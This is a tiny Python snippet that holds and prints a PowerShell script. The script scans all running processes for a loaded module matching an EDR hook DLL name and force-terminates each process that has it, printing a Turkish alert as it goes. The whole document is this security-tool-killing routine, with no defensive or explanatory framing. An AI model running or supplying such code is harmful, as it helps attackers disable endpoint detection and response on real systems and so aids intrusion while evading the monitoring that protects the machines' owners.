x = """


$edrDll = "edrhook.dll"
Get-Process | ForEach-Object {
    try {
        $modules = $_.Modules
        foreach ($mod in $modules) {
            if ($mod.ModuleName -like "*$edrDll*") {
                Write-Host "[!] EDR DLL bulundu: $($mod.ModuleName) in process $($_.Name)"
                Stop-Process -Id $_.Id -Force
            }
        }
    } catch {}
}
"""
print(x)